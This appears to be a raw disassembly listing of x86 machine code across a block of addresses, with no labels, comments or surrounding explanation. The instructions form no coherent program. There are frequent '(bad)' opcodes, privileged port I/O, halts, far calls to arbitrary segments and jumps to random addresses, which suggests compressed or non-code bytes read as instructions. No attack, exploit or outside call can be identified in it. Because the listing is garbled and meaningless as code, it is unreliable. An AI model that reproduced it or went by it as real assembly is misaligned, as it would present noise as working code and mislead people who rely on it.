  421c70:	in     eax,dx
  421c71:	mov    al,ds:0xd0e37eaa
  421c76:	sti    
  421c77:	mul    BYTE PTR ds:0x73916208
  421c7d:	mov    esi,0xb7226781
  421c82:	jbe    0x421c4f
  421c84:	cs sahf 
  421c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c87:	fadd   st(1),st
  421c89:	hlt    
  421c8a:	scas   al,BYTE PTR es:[edi]
  421c8b:	dec    ebp
  421c8c:	push   esp
  421c8d:	mov    ebx,0x3af862b2
  421c92:	xchg   ebp,eax
  421c93:	push   edi
  421c94:	mov    bh,0x26
  421c96:	dec    edi
  421c97:	loope  0x421cb0
  421c99:	pop    eax
  421c9a:	inc    esi
  421c9b:	mov    ebp,DWORD PTR [edi-0x48]
  421c9e:	or     BYTE PTR ds:0xd5b26d86,al
  421ca4:	pop    esi
  421ca5:	or     al,0x6c
  421ca7:	les    esi,FWORD PTR [ecx]
  421ca9:	push   ecx
  421caa:	jecxz  0x421cda
  421cac:	test   al,0x32
  421cae:	mov    ds:0xa40faedb,ax
  421cb4:	jge    0x421ce5
  421cb6:	add    al,0x12
  421cb8:	inc    DWORD PTR [ebp+ebx*4+0x32ec34a4]
  421cbf:	jecxz  0x421cb7
  421cc1:	outs   dx,DWORD PTR ds:[esi]
	...
  421d32:	add    BYTE PTR [eax],al
  421d34:	out    0x1e,eax
  421d36:	into   
  421d37:	push   0x9fe7f8ff
  421d3c:	cmp    al,0xf2
  421d3e:	sub    al,0x59
  421d40:	(bad)  
  421d41:	ret    
  421d42:	jb     0x421cf5
  421d44:	sub    BYTE PTR [edx+0x1],ch
  421d47:	add    dh,dh
  421d49:	add    BYTE PTR [eax],al
  421d4b:	add    ch,bh
  421d4d:	sbb    bl,BYTE PTR [ebp+0x5aeaeb9c]
  421d53:	push   ebp
  421d54:	call   0xc29e54ad
  421d59:	inc    ebp
  421d5a:	or     ch,ah
  421d5c:	sti    
  421d5d:	jmp    0x421d72
  421d5f:	es jns 0x421db0
  421d62:	sub    BYTE PTR ds:0xde0e8681,bh
  421d68:	jbe    0x421de0
  421d6a:	cld    
  421d6b:	push   ss
  421d6c:	xor    esp,DWORD PTR [esi]
  421d6e:	jne    0x421d64
  421d70:	out    0x8f,al
  421d72:	and    BYTE PTR [ebx],0x78
  421d75:	mov    ah,0xd5
  421d77:	mov    esi,0xdb4e2e04
  421d7c:	jno    0x421d2f
  421d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d7f:	daa    
  421d80:	(bad)  
  421d82:	add    DWORD PTR [ecx+ebp*8+0x3],ebp
  421d86:	aad    0x64
  421d88:	pop    ebx
  421d89:	dec    ebp
  421d8a:	lock icebp 
  421d8c:	inc    ebx
  421d8d:	inc    ebx
  421d8e:	jo     0x421d22
  421d90:	mov    eax,0xa6067b2a
  421d95:	push   0xffffffd0
  421d97:	fwait
  421d98:	addr16 js 0x421d24
  421d9b:	sbb    eax,0x741c1ebe
  421da0:	push   ebp
  421da1:	rol    DWORD PTR [eax+ebx*1+0x46e61596],1
  421da8:	add    eax,0x24a06ae7
  421dad:	ins    DWORD PTR es:[edi],dx
  421dae:	fstp   DWORD PTR [ecx+ecx*2]
  421db1:	mov    al,ds:0xb1099d54
  421db6:	jnp    0x421d58
  421db8:	sbb    al,0xa7
  421dba:	arpl   WORD PTR [esi-0x3a],ax
  421dbd:	mov    ds:0x3162869a,eax
  421dc2:	fisub  WORD PTR [eax+edx*8-0x26]
  421dc6:	jne    0x421de1
  421dc8:	aad    0x22
  421dca:	xchg   esp,eax
  421dcb:	ret    0xaafa
  421dce:	sub    dl,BYTE PTR [edx+0x38a143b0]
  421dd4:	xor    BYTE PTR [esi-0x67],bh
  421dd7:	inc    ecx
  421dd8:	xchg   esp,eax
  421dd9:	jl     0x421daf
  421ddb:	xor    BYTE PTR [ebp-0x56c11e44],ch
  421de1:	retf   0x669
  421de4:	enter  0x726a,0x25
  421de8:	(bad)  
  421de9:	hlt    
  421dea:	dec    ecx
  421deb:	popf   
  421dec:	inc    esi
  421ded:	or     BYTE PTR [ebp-0x214956cc],cl
  421df3:	jp     0x421dcc
  421df5:	lahf   
  421df6:	gs dec edi
  421df8:	mov    WORD PTR [esi],ss
  421dfa:	fistp  QWORD PTR [edi+0x42]
  421dfd:	pop    edi
  421dfe:	js     0x421e75
  421e00:	sbb    al,0xfa
  421e02:	dec    ecx
  421e03:	mov    cl,0xfb
  421e05:	add    al,ah
  421e07:	dec    edx
  421e08:	das    
  421e09:	xchg   ecx,eax
  421e0a:	scas   al,BYTE PTR es:[edi]
  421e0b:	enter  0x4d66,0x2
  421e0f:	mov    BYTE PTR [ebx+0xa],bh
  421e12:	popf   
  421e13:	inc    edi
  421e14:	cmp    dh,BYTE PTR [esi]
  421e16:	jns    0x421e6f
  421e18:	push   0xa3ee2643
  421e1d:	push   ebp
  421e1e:	repnz inc esp
  421e20:	inc    eax
  421e21:	or     al,0xa1
  421e23:	pop    ebp
  421e24:	pop    eax
  421e25:	add    BYTE PTR [ebp-0x1f0f2b6c],0xea
  421e2c:	jno    0x421e6d
  421e2e:	std    
  421e2f:	mov    ecx,0x37d2574
  421e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e35:	pop    eax
  421e36:	bound  esp,QWORD PTR [eax+0xf]
  421e39:	gs xchg edi,eax
  421e3b:	inc    ebp
  421e3c:	sahf   
  421e3d:	add    BYTE PTR [ecx+0x38],0x34
  421e41:	pop    edx
	...
  421eb2:	add    BYTE PTR [eax],al
  421eb4:	and    BYTE PTR [edi-0x28082cbe],dl
  421eba:	mov    cl,0xf7
  421ebc:	fisttp WORD PTR [ebx-0x19]
  421ebf:	jo     0x421f17
  421ec1:	sbb    al,0xf
  421ec3:	ins    DWORD PTR es:[edi],dx
  421ec4:	push   ds
  421ec5:	imul   eax,DWORD PTR [ecx],0x0
  421ec8:	test   BYTE PTR [eax],0x0
  421ecb:	add    BYTE PTR [edx-0x70],dh
  421ece:	dec    esp
  421ecf:	fild   QWORD PTR [ebx]
  421ed1:	inc    ecx
  421ed2:	inc    ebx
  421ed3:	rcl    ch,cl
  421ed5:	sub    cl,BYTE PTR [edx+esi*8+0x42]
  421ed9:	and    bh,BYTE PTR [eax+0x2e]
  421edc:	ins    BYTE PTR es:[edi],dx
  421edd:	pop    eax
  421ede:	retf   
  421edf:	inc    ebp
  421ee0:	adc    ah,BYTE PTR [ecx]
  421ee2:	es stos DWORD PTR es:[edi],eax
  421ee4:	xor    al,0x19
  421ee6:	add    al,BYTE PTR [esi-0x7a8bda69]
  421eec:	pop    ds
  421eed:	in     eax,dx
  421eee:	cs jmp 0x9d447afe
  421ef4:	daa    
  421ef5:	pop    es
  421ef6:	test   BYTE PTR [edx-0x69],ah
  421ef9:	mov    DWORD PTR [esi],ecx
  421efb:	mov    ah,0x58
  421efd:	xchg   ebp,eax
  421efe:	imul   esp,DWORD PTR [ebp+0x4a],0x33
  421f02:	jl     0x421f4f
  421f04:	imul   eax,DWORD PTR [eax+0x731d744b],0x1b
  421f0b:	lahf   
  421f0c:	lea    esp,[ecx+edi*8+0x4c008843]
  421f13:	jno    0x421f21
  421f15:	mov    ebp,0x659d8250
  421f1a:	add    ebx,ecx
  421f1c:	jecxz  0x421ee0
  421f1e:	sahf   
  421f1f:	cmp    ebx,0xffffff89
  421f22:	mov    BYTE PTR [edi-0x2b],dh
  421f25:	out    0xfd,al
  421f27:	repnz sub eax,0x4a51bb9a
  421f2d:	and    al,0x36
  421f2f:	or     DWORD PTR [ecx],eax
  421f31:	jb     0x421f12
  421f33:	mov    edx,0xf7057a9a
  421f38:	push   ebx
  421f39:	sbb    al,0x2
  421f3b:	retf   0x1320
  421f3e:	call   DWORD PTR [edi+0x6a]
  421f41:	gs test eax,0xf636c064
  421f47:	loop   0x421faf
  421f49:	adc    edi,ebp
  421f4b:	cwde   
  421f4c:	cs mov esi,0xe7986b51
  421f52:	dec    esi
  421f53:	xor    al,0xd
  421f55:	sub    al,0xbb
  421f57:	pop    edx
  421f58:	in     al,dx
  421f59:	popa   
  421f5a:	push   ss
  421f5b:	jno    0x421f6f
  421f5d:	loop   0x421f23
  421f5f:	(bad)
  421f62:	dec    esi
  421f63:	rcl    BYTE PTR [edx+ebp*2],0x3a
  421f67:	iret   
  421f68:	call   0x93b7:0x3f2afa58
  421f6f:	dec    ebx
  421f70:	arpl   WORD PTR [ecx+0x58978c09],bx
  421f76:	cmc    
  421f77:	ret    
  421f78:	mov    ebx,0x94f7d641
  421f7d:	mov    ecx,0x1cb22043
  421f83:	aam    0xd9
  421f85:	xor    BYTE PTR [esi-0x129784ee],dh
  421f8b:	(bad)  
  421f8c:	xor    DWORD PTR [ecx+edx*1],esi
  421f8f:	js     0x421f50
  421f91:	ja     0x421f27
  421f93:	iret   
  421f94:	test   eax,0x231d5c06
  421f99:	sbb    al,0xfb
  421f9b:	dec    esi
  421f9c:	pop    ds
  421f9d:	les    ebp,FWORD PTR [ebx]
  421f9f:	arpl   WORD PTR [ebx-0x7d676477],bx
  421fa5:	leave  
  421fa6:	into   
  421fa7:	pushf  
  421fa8:	(bad)  
  421faa:	jno    0x421fa4
  421fac:	dec    eax
  421fad:	in     eax,dx
  421fae:	jno    0x421fce
  421fb0:	push   es
  421fb1:	sub    al,0x9e
  421fb3:	fst    QWORD PTR [ebx+0x47]
  421fb6:	dec    esi
  421fb7:	pop    eax
  421fb8:	cdq    
  421fb9:	sub    bl,bh
  421fbb:	out    dx,eax
  421fbc:	sub    DWORD PTR [esi],esp
  421fbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fbf:	aaa    
  421fc0:	dec    esp
  421fc1:	add    BYTE PTR fs:[eax],al
	...
  422034:	lahf   
  422035:	pop    esi
  422036:	fcmovb st,st(6)
  422038:	fcmovnb st,st(6)
  42203a:	lahf   
  42203b:	pop    edi
  42203c:	bnd ja 0x422029
  42203f:	mov    edi,0x84b53998
  422044:	adc    al,0x6c
  422046:	add    DWORD PTR [eax],eax
  422048:	test   BYTE PTR [eax],0x0
  42204b:	add    dl,dl
  42204d:	popf   
  42204e:	stos   BYTE PTR es:[edi],al
  42204f:	dec    ebx
  422050:	push   cs
  422051:	pop    es
  422052:	mov    ah,0x46
  422054:	push   ebx
  422055:	xchg   ebx,eax
  422056:	sar    DWORD PTR [edi],1
  422058:	push   ebx
  422059:	xor    eax,0x1a92060a
  42205e:	int    0xf6
  422060:	inc    eax
  422061:	jp     0x42200a
  422063:	out    0x23,al
  422065:	push   esi
  422066:	lea    ecx,[edi]
  422068:	xchg   ebp,eax
  422069:	fnsave [ebx]
  42206b:	mov    edi,0x431ec272
  422070:	xchg   BYTE PTR [ebp+0x3a],al
  422073:	gs lahf 
  422075:	mov    cl,dl
  422077:	or     ebp,DWORD PTR [eax-0xe]
  42207a:	outs   dx,DWORD PTR ds:[esi]
  42207b:	fidivr WORD PTR [ecx+0x5d]
  42207e:	call   0xbff7:0xb16e420e
  422085:	retf   0xa965
  422088:	mov    ds:0x95cf6ad0,al
  42208d:	or     BYTE PTR [ebp+0x1fba66c2],bh
  422093:	sar    DWORD PTR [ebx],0x1a
  422096:	out    0xeb,eax
  422098:	and    BYTE PTR [esi+ebx*8],0x7d
  42209c:	inc    ecx
  42209d:	push   cs
  42209e:	enter  0x7bb7,0x54
  4220a2:	dec    ecx
  4220a3:	imul   eax,DWORD PTR [edi+eax*4-0x78],0xffffffd5
  4220a8:	pop    edx
  4220a9:	popa   
  4220aa:	cs mov esi,0x2fd52605
  4220b0:	test   al,0xfc
  4220b2:	out    dx,al
  4220b3:	mov    ebp,DWORD PTR [ecx+0x69]
  4220b6:	clc    
  4220b7:	jg     0x4220cd
  4220b9:	icebp  
  4220ba:	cmc    
  4220bb:	xor    ah,BYTE PTR [ebx-0x55e25bbd]
  4220c1:	add    ah,BYTE PTR [eax+eiz*1]
  4220c4:	pop    es
  4220c5:	pop    ds
  4220c6:	fucom  st(7)
  4220c8:	inc    esp
  4220c9:	fsqrt  
  4220cb:	out    dx,al
  4220cc:	pop    edx
  4220cd:	mov    WORD PTR [ebx-0x334311f3],es
  4220d3:	sub    ch,bl
  4220d5:	popa   
  4220d6:	xlat   BYTE PTR ds:[ebx]
  4220d7:	xor    esp,esp
  4220d9:	push   edx
  4220da:	je     0x42210a
  4220dc:	das    
  4220dd:	lahf   
  4220de:	inc    ebx
  4220df:	test   al,0xdf
  4220e1:	ficomp DWORD PTR [eax-0x2c]
  4220e4:	sti    
  4220e5:	call   0xd8fb:0xdeb9cf4c
  4220ec:	push   es
  4220ed:	cmp    ebp,DWORD PTR [edi+0xe]
  4220f0:	mov    ebp,0xd2c6854c
  4220f5:	jmp    0x422146
  4220f7:	popf   
  4220f8:	sub    eax,0x56cb44d6
  4220fd:	pop    es
  4220fe:	and    eax,0xce03f123
  422103:	pop    edx
  422104:	pop    ecx
  422105:	adc    DWORD PTR [ebp-0x55],0x222bdb78
  42210c:	or     eax,0x72dbd520
  422111:	cdq    
  422112:	xchg   ecx,eax
  422113:	mov    esp,0xdc484b4f
  422118:	ds sbb edx,ebx
  42211b:	add    esp,edi
  42211d:	sar    DWORD PTR [eax+0x1409ea52],1
  422123:	xor    edx,DWORD PTR [eax+0x18]
  422126:	mov    esi,?
  422128:	nop
  422129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42212a:	mov    edx,0x7b309c12
  42212f:	xchg   ecx,eax
  422130:	setns  bh
  422133:	xchg   edx,eax
  422134:	xchg   ecx,eax
  422135:	rcr    dl,cl
  422137:	nop    edx
  42213a:	or     al,0x32
  42213c:	inc    ecx
  42213d:	cmp    DWORD PTR [ebp+edx*8-0x36],0xffffffa7
	...
  4221b2:	add    BYTE PTR [eax],al
  4221b4:	sahf   
  4221b5:	pop    ds
  4221b6:	(bad)  
  4221b7:	test   DWORD PTR [edi+0x3b7ffef7],0xa9d52766
  4221c1:	jno    0x422175
  4221c3:	mov    bh,0xa
  4221c5:	ins    DWORD PTR es:[edi],dx
  4221c6:	add    DWORD PTR [eax],eax
  4221c8:	test   BYTE PTR [eax],0x0
  4221cb:	add    cl,bl
  4221cd:	mov    edx,DWORD PTR [edi+0xae708fa]
  4221d3:	icebp  
  4221d4:	int    0x97
  4221d6:	xchg   edx,eax
  4221d7:	call   0x4191:0x6de3ab13
  4221de:	jbe    0x4221ed
  4221e0:	iret   
  4221e1:	icebp  
  4221e2:	ja     0x4221de
  4221e4:	mov    esi,0xf320c97d
  4221e9:	cld    
  4221ea:	adc    dl,cl
  4221ec:	mov    ah,0x92
  4221ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221ef:	scas   eax,DWORD PTR es:[edi]
  4221f0:	call   0xc745:0x8da5876a
  4221f7:	into   
  4221f8:	sar    esi,cl
  4221fa:	jl     0x4221d0
  4221fc:	add    al,0xfc
  4221fe:	dec    eax
  4221ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422200:	add    BYTE PTR [esi+0x71945c3a],0x72
  422207:	and    ah,ch
  422209:	mov    ecx,0x8fdef62d
  42220e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42220f:	push   0x69e27dc8
  422214:	scas   eax,DWORD PTR es:[edi]
  422215:	sub    al,0x9e
  422217:	xchg   ebp,eax
  422218:	sub    edx,DWORD PTR [ebp-0x9]
  42221b:	sahf   
  42221c:	dec    esp
  42221d:	aam    0x59
  42221f:	jae    0x4221e2
  422221:	paddd  mm4,mm4
  422224:	pop    esi
  422225:	lar    edi,bp
  422228:	jge    0xa286b993
  42222e:	mov    al,ds:0x66aee9fb
  422233:	pop    eax
  422234:	xor    esp,DWORD PTR [edi]
  422236:	inc    edi
  422237:	shl    ecx,cl
  422239:	xchg   ebx,eax
  42223a:	pusha  
  42223b:	into   
  42223c:	scas   eax,DWORD PTR es:[edi]
  42223d:	sbb    eax,0x140ca36d
  422242:	jb     0x422257
  422244:	jne    0x42229d
  422246:	sbb    al,0x19
  422248:	call   0x2edcb238
  42224d:	sbb    cl,ch
  42224f:	xchg   ebp,ebx
  422251:	mov    al,0x84
  422253:	or     al,0xbf
  422255:	push   ebp
  422256:	mov    ch,0x8d
  422258:	push   edi
  422259:	adc    BYTE PTR [edi+0x12],bl
  42225c:	stos   DWORD PTR es:[edi],eax
  42225d:	adc    dh,BYTE PTR [esp+edi*4]
  422260:	add    DWORD PTR [eax],edi
  422262:	rol    cl,cl
  422264:	dec    esp
  422265:	jmp    0x422212
  422267:	mov    cl,0xea
  422269:	or     esp,DWORD PTR [edx+ebp*8-0x6aea5caa]
  422270:	mov    ebp,0x9690e6b0
  422275:	es stos BYTE PTR es:[edi],al
  422277:	inc    esp
  422278:	iret   
  422279:	xor    al,0x6
  42227b:	fistp  DWORD PTR [esp+esi*8+0x3828cc9e]
  422282:	push   esi
  422283:	fcomp  QWORD PTR [esp+eax*2-0x7951e9d2]
  42228a:	cmc    
  42228b:	mov    ah,0xe4
  42228d:	jmp    FWORD PTR [ebp-0x73]
  422290:	mov    ebp,0xe7321896
  422295:	out    dx,eax
  422296:	sbb    bh,cl
  422298:	add    dh,dh
  42229a:	adc    eax,0xa7e19db8
  42229f:	or     BYTE PTR [edi],cl
  4222a1:	push   0xffffffb2
  4222a3:	stc    
  4222a4:	lods   al,BYTE PTR ds:[esi]
  4222a5:	sub    al,0x6c
  4222a7:	add    ch,al
  4222a9:	test   al,0x96
  4222ab:	pop    esp
  4222ac:	enter  0x83a7,0x4c
  4222b0:	stc    
  4222b1:	or     edi,edx
  4222b3:	ins    DWORD PTR es:[edi],dx
  4222b4:	push   esi
  4222b5:	repz cmp eax,0xc1778566
  4222bb:	call   0xd612cc43
  4222c0:	sbb    dh,BYTE PTR [eax+0x0]
	...
  422332:	add    BYTE PTR [eax],al
  422334:	inc    bh
  422336:	pop    esp
  422337:	mov    eax,ds:0xdfffbb7d
  42233c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233d:	inc    edi
  42233e:	gs pop es
  422340:	mov    esp,ebx
  422342:	dec    esp
  422343:	int    0x0
  422345:	outs   dx,BYTE PTR ds:[esi]
  422346:	add    DWORD PTR [eax],eax
  422348:	test   BYTE PTR [eax],0x0
  42234b:	add    BYTE PTR [edi-0x13639964],bh
  422351:	dec    ecx
  422352:	pop    es
  422353:	jp     0x422355
  422355:	std    
  422356:	mov    cs,WORD PTR [edx]
  422358:	repz xlat BYTE PTR ds:[ebx]
  42235a:	in     eax,dx
  42235b:	test   eax,0xa1cecd18
  422360:	lea    ebp,[ebx+0x1b0ffd81]
  422366:	dec    esi
  422367:	adc    dh,ah
  422369:	not    BYTE PTR [esi+0x26]
  42236c:	mov    edi,0x97facbad
  422371:	sub    al,0x1c
  422373:	xchg   ebx,eax
  422374:	add    edx,edx
  422376:	mov    esp,0xb8e8d830
  42237b:	popaw  
  42237d:	fcom   QWORD PTR [edx-0x29]
  422380:	pop    ebx
  422381:	inc    esi
  422382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422383:	sbb    al,BYTE PTR [ecx+0x6f]
  422386:	xchg   edi,eax
  422387:	mov    edi,0xbe679cd7
  42238c:	arpl   WORD PTR [ecx+0x56],si
  42238f:	lods   al,BYTE PTR ds:[esi]
  422390:	mov    ah,BYTE PTR [esi-0x63]
  422393:	pop    ebp
  422394:	mov    esp,0xd13a0aeb
  422399:	xchg   edi,eax
  42239a:	and    DWORD PTR [ebx+esi*2-0x5037427e],edi
  4223a1:	gs push ebx
  4223a3:	pushf  
  4223a4:	retf   0x1589
  4223a7:	stc    
  4223a8:	lea    eax,es:[ebx-0x49]
  4223ac:	pop    ebp
  4223ad:	gs jg  0x422389
  4223b0:	scas   al,BYTE PTR es:[edi]
  4223b1:	ins    DWORD PTR es:[edi],dx
  4223b2:	adc    ah,BYTE PTR [edx-0x25]
  4223b5:	inc    esp
  4223b6:	jmp    0x59e861f
  4223bb:	lock je 0x4223ab
  4223be:	test   DWORD PTR [ebx+0x62aaa4ff],eax
  4223c4:	and    dl,BYTE PTR [edx]
  4223c6:	xchg   ebx,eax
  4223c7:	sar    DWORD PTR [edi+edi*8],1
  4223ca:	ds loope 0x422406
  4223cd:	and    BYTE PTR [esp+eiz*8],bh
  4223d0:	neg    BYTE PTR [eax+edx*1]
  4223d3:	lock lds ecx,FWORD PTR [ebx-0x732cd1fc]
  4223da:	mov    bl,0x95
  4223dc:	gs jns 0x42243c
  4223df:	add    BYTE PTR [ebx-0x2ca24ca8],bl
  4223e5:	xor    ch,0xa
  4223e8:	inc    eax
  4223e9:	shl    DWORD PTR [ecx-0x7c802529],0x15
  4223f0:	inc    edi
  4223f1:	dec    ebx
  4223f2:	inc    edx
  4223f3:	call   0xbf86f5ad
  4223f8:	cbw    
  4223fa:	xchg   edi,eax
  4223fb:	out    dx,al
  4223fc:	and    al,BYTE PTR [esi+0x77]
  4223ff:	inc    ecx
  422400:	mov    edx,0x70a16fa3
  422405:	je     0x42242c
  422407:	sbb    DWORD PTR [eax-0x35729803],edi
  42240d:	(bad)  
  42240f:	push   0xa92827fa
  422414:	inc    esi
  422415:	sbb    BYTE PTR [edx-0x61143409],bh
  42241b:	pop    ss
  42241c:	ss dec ebp
  42241e:	dec    esp
  42241f:	pop    edx
  422420:	add    cl,BYTE PTR [eax+esi*2]
  422423:	pop    esp
  422424:	ficomp DWORD PTR [esi+0x64b71b98]
  42242a:	loopne 0x422478
  42242c:	mov    BYTE PTR [eax],dh
  42242e:	ins    BYTE PTR es:[edi],dx
  42242f:	loope  0x422487
  422431:	adc    ah,BYTE PTR [eax+0x41d6e94f]
  422437:	pop    esp
  422438:	mov    dh,0x85
  42243a:	in     eax,dx
  42243b:	fcomp  QWORD PTR [edx-0x17]
  42243e:	rol    DWORD PTR [ebx-0x24],cl
  422441:	and    al,BYTE PTR [eax]
	...
  4224b3:	add    dh,dl
  4224b5:	repnz test BYTE PTR [eax],bl
  4224b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b9:	jle    0x422499
  4224bb:	(bad)  
  4224bc:	(bad)  
  4224bd:	mov    edx,0x49559f7c
  4224c2:	xor    ah,BYTE PTR [edx+0x16ef6]
  4224c8:	test   BYTE PTR [eax],0x0
  4224cb:	add    BYTE PTR [edx-0x40df6240],ch
  4224d1:	inc    esp
  4224d2:	pop    ebx
  4224d3:	cli    
  4224d4:	enter  0x3be0,0x60
  4224d8:	add    bl,dl
  4224da:	daa    
  4224db:	mov    BYTE PTR [esi],al
  4224dd:	sti    
  4224de:	es mov dh,0xec
  4224e1:	xchg   esp,eax
  4224e2:	jb     0x4224e2
  4224e4:	test   BYTE PTR [ecx],al
  4224e6:	je     0x4224cd
  4224e8:	push   ecx
  4224e9:	rcr    BYTE PTR [ecx-0x947c888],cl
  4224ef:	fldcw  WORD PTR [edi-0x3b]
  4224f2:	shl    DWORD PTR [edi+0x646e552f],cl
  4224f8:	fs adc al,0xe0
  4224fb:	mov    esi,0x374400f9
  422500:	(bad)  
  422501:	pop    eax
  422502:	jno    0x42256c
  422504:	(bad)  
  422505:	gs mov bl,0x4e
  422508:	mov    ecx,0xac3ffcb2
  42250d:	jle    0x4224cd
  42250f:	(bad)
  422512:	stos   DWORD PTR es:[edi],eax
  422513:	cmovno ebx,DWORD PTR [edi]
  422516:	pop    edi
  422517:	clc    
  422518:	jmp    0x37de:0x57213157
  42251f:	loopne 0x422550
  422521:	cdq    
  422522:	mov    bh,bh
  422524:	mov    edx,0x77360ecd
  422529:	lods   eax,DWORD PTR ds:[esi]
  42252a:	or     bl,BYTE PTR [esi+0x6d51fbe3]
  422530:	lss    esp,FWORD PTR [ebx+edx*8+0x3ba1e83d]
  422538:	xor    al,0xf8
  42253a:	mov    ecx,0x1637cca9
  42253f:	loope  0x422587
  422541:	pop    ebx
  422542:	fdivr  st,st(2)
  422544:	add    DWORD PTR [ebx-0x440e0169],eax
  42254a:	cmp    al,0xbb
  42254c:	xchg   ebp,eax
  42254d:	xchg   edx,eax
  42254e:	ins    DWORD PTR es:[edi],dx
  42254f:	ja     0x422540
  422551:	push   ss
  422552:	jae    0x422510
  422554:	or     edi,edx
  422556:	out    0xb0,al
  422558:	mov    eax,DWORD PTR [ebx-0xa]
  42255b:	push   cs
  42255c:	mov    cl,0xed
  42255e:	mov    ch,0x61
  422560:	dec    edx
  422561:	cmp    esp,0x19
  422564:	test   eax,0x11f680e6
  422569:	mov    esp,0x40aa06d6
  42256e:	out    dx,eax
  42256f:	mov    dl,0xab
  422571:	out    0xa6,al
  422573:	mov    ebx,0xbf8a9c98
  422578:	outs   dx,BYTE PTR ds:[esi]
  422579:	scas   al,BYTE PTR es:[edi]
  42257a:	push   esp
  42257b:	std    
  42257c:	adc    al,0x70
  42257e:	xor    al,0x2a
  422580:	int3   
  422581:	push   es
  422582:	or     al,0xf7
  422584:	ins    BYTE PTR es:[edi],dx
  422585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422586:	sub    eax,0x34af9157
  42258b:	int3   
  42258c:	xchg   ebx,eax
  42258d:	mov    ah,0x43
  42258f:	inc    esp
  422590:	xor    dl,0x2e
  422593:	push   0xe92a1d73
  422598:	fadd   st,st(1)
  42259a:	addr16 jbe 0x4225f3
  42259d:	sbb    BYTE PTR [esi+0x10],0xa3
  4225a1:	pop    eax
  4225a2:	pop    esi
  4225a3:	es imul edx,esi,0x65f73acf
  4225aa:	es xor al,0x4c
  4225ad:	in     al,0x4f
  4225af:	(bad)  
  4225b0:	mov    ecx,0x3a75c512
  4225b5:	jle    0x422549
  4225b7:	mov    eax,edx
  4225b9:	ds dec ecx
  4225bb:	pop    ds
  4225bc:	mov    cl,0x12
  4225be:	push   ds
  4225bf:	sub    eax,DWORD PTR [edi-0xa]
	...
  422632:	add    BYTE PTR [eax],al
  422634:	stos   DWORD PTR es:[edi],eax
  422635:	sub    al,0xed
  422637:	stos   BYTE PTR es:[edi],al
  422638:	out    dx,eax
  422639:	jmp    0x42262a
  42263b:	sub    eax,0xb720f321
  422640:	mov    DWORD PTR [ecx-0x3e],ebp
  422643:	xor    ah,ch
  422645:	outs   dx,DWORD PTR ds:[esi]
  422646:	add    DWORD PTR [eax],eax
  422648:	test   BYTE PTR [eax],0x0
  42264b:	add    BYTE PTR [edx-0x24],bl
  42264e:	and    bh,bh
  422650:	xchg   ebp,eax
  422651:	mov    ds:0x367da671,eax
  422656:	jmp    0x4225f6
  422658:	mov    al,ds:0xad1b4d88
  42265d:	pop    edx
  42265e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42265f:	dec    edi
  422660:	mov    ds:0x98d98ccd,al
  422665:	adc    eax,DWORD PTR [ecx+0x60]
  422668:	stos   BYTE PTR es:[edi],al
  422669:	pop    ss
  42266a:	retf   
  42266b:	mov    al,ds:0xaedb39ef
  422670:	scas   eax,DWORD PTR es:[edi]
  422671:	push   ecx
  422672:	in     al,0x78
  422674:	add    al,0x63
  422676:	iret   
  422677:	cmp    edi,DWORD PTR [edx+0x3b]
  42267a:	xor    BYTE PTR [edi],dl
  42267c:	ffree  st(6)
  42267e:	in     al,0x8b
  422680:	aaa    
  422681:	push   edx
  422682:	fcomp  QWORD PTR [eax-0x2]
  422685:	inc    esi
  422686:	mov    eax,ds:0x595d0a5d
  42268b:	xchg   edi,eax
  42268c:	loop   0x4226f9
  42268e:	nop
  42268f:	or     ah,BYTE PTR [edx+0x1a]
  422692:	out    dx,al
  422693:	ins    DWORD PTR es:[edi],dx
  422694:	enter  0x4088,0x23
  422698:	dec    esp
  422699:	in     al,dx
  42269a:	pop    edi
  42269b:	aad    0x39
  42269d:	inc    edx
  42269e:	ins    BYTE PTR es:[edi],dx
  42269f:	sub    esi,DWORD PTR [ebx]
  4226a1:	aad    0x75
  4226a3:	popf   
  4226a4:	retf   0x95d1
  4226a7:	cli    
  4226a8:	daa    
  4226a9:	or     al,0x43
  4226ab:	sub    DWORD PTR [esi+0x3d41b237],ecx
  4226b1:	inc    edx
  4226b2:	inc    esp
  4226b3:	neg    ebx
  4226b5:	mov    ah,0xce
  4226b7:	cmc    
  4226b8:	gs jnp 0x422715
  4226bb:	cmp    bh,0xaf
  4226be:	ja     0x4226c8
  4226c0:	add    BYTE PTR [ecx+0x6d78e281],ch
  4226c6:	out    0xb2,eax
  4226c8:	sbb    eax,0x8f947b4e
  4226cd:	pop    ecx
  4226ce:	or     cl,BYTE PTR cs:[ebx+0x11]
  4226d2:	lahf   
  4226d3:	aas    
  4226d4:	adc    DWORD PTR [eax+0x71],ebx
  4226d7:	jle    0x422682
  4226d9:	add    al,0x34
  4226db:	pop    ss
  4226dc:	rol    BYTE PTR [edi],0x4
  4226df:	and    cl,BYTE PTR [eax]
  4226e1:	outs   dx,BYTE PTR ds:[esi]
  4226e2:	sbb    edi,DWORD PTR [edi+0x4a89a3c5]
  4226e8:	inc    DWORD PTR [ebx+0x8]
  4226eb:	hlt    
  4226ec:	push   0xffffffac
  4226ee:	adc    edi,edx
  4226f0:	push   ebp
  4226f1:	xchg   ecx,eax
  4226f2:	int3   
  4226f3:	imul   esi,DWORD PTR [esi+0x538d8963],0x4
  4226fa:	jae    0x422778
  4226fc:	adc    eax,ebp
  4226fe:	arpl   WORD PTR [ebp-0x26],bx
  422701:	mov    eax,ds:0x7fa7126c
  422706:	cdq    
  422707:	dec    ebp
  422708:	loopne 0x4226d9
  42270a:	jp     0x4226f4
  42270c:	fsubr  DWORD PTR [eax+0xec2f622]
  422712:	sub    eax,0xc2b12aac
  422717:	sub    cx,WORD PTR [eax+edx*2+0x45f1c5af]
  42271f:	ret    0xeeb0
  422722:	jmp    0x4226b8
  422724:	push   ds
